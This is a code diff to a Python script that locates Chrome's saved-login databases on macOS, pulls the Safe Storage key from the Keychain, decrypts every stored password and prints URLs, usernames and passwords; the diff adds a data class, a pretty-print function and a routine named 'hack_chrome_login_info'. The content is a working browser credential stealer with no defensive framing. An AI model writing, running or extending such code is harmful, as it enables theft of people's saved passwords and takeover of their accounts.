@@ -1,3 +1,4 @@
+from dataclasses import dataclass
 import os
 import glob
 import sqlite3
@@ -9,6 +10,13 @@ import platform
 import json
 import base64
 import shutil
+
+
+@dataclass
+class LoginInfo:
+    url: str
+    username: str
+    password: str
 
 
 def get_login_data_paths() -> list:
@@ -145,7 +153,7 @@ def chrome_decrypt(encrypted_value: bytes, key_16: bytes) -> str:
         return f"[Decryption Error: {str(e)}]"
 
 
-def process_login_data(login_data_path: str, safe_storage_key: str) -> list:
+def process_login_data(login_data_path: str, safe_storage_key: str) -> list[LoginInfo]:
     """
     Process a single Login Data database to decrypt stored credentials.
     Args:
@@ -184,7 +192,8 @@ def process_login_data(login_data_path: str, safe_storage_key: str) -> list:
 
             # Decrypt the password
             decrypted_password = chrome_decrypt(encrypted_password, key_16)
-            decrypted_list.append((url or "[No URL]", username, decrypted_password))
+            decrypted_list.append(LoginInfo(url or "[No URL]", username, decrypted_password))
+            # decrypted_list.append((url or "[No URL]", username, decrypted_password))
 
         cursor.close()
         conn.close()
@@ -197,33 +206,42 @@ def process_login_data(login_data_path: str, safe_storage_key: str) -> list:
 
     return decrypted_list
 
+def beauty_print(login_list: list[LoginInfo]) -> None:
+    """
+    美观地打印包含 LoginInfo 的列表。
 
-def main():
+    :param login_list: 包含 LoginInfo 对象的列表
     """
-    Main function to locate, process, and decrypt Chrome Login Data files.
-    """
-    # Locate all potential Login Data files
+    if not login_list:
+        print("No login information available.")
+        return
+    
+    print("=" * 50)
+    print("Login Credentials")
+    print("=" * 50)
+
+    for i, info in enumerate(login_list, start=1):
+        print(f"[{i}]")
+        print(f"  URL:      {info.url}")
+        print(f"  Username: {info.username}")
+        print(f"  Password: {info.password}")
+        print("-" * 50)
+
+    print("End of List")
+    print("=" * 50)
+
+def hack_chrome_login_info()->list[LoginInfo]:
     login_data_paths = get_login_data_paths()
-
-    # Retrieve the Safe Storage Key from macOS Keychain
     safe_storage_key = fetch_safe_storage_key("Chrome")
-
-    # Process each Login Data file
+    
+    credentials :list[LoginInfo]= []
     for login_data_path in login_data_paths:
-        print(f"\n=== Processing: {login_data_path} ===")
-        try:
-            decrypted_credentials = process_login_data(
-                login_data_path, safe_storage_key
-            )
-            for i, (url, username, password) in enumerate(
-                decrypted_credentials, start=1
-            ):
-                print(f"[{i}] URL: {url}")
-                print(f"    Username: {username}")
-                print(f"    Password: {password}")
-        except Exception as e:
-            print(f"ERROR: Failed to process {login_data_path}: {e}")
-
+        decrypted_credentials = process_login_data(
+                    login_data_path, safe_storage_key
+                )
+        credentials.extend(decrypted_credentials)
+    return credentials
 
 if __name__ == "__main__":
-    main()
+    infos = hack_chrome_login_info()
+    beauty_print(infos)
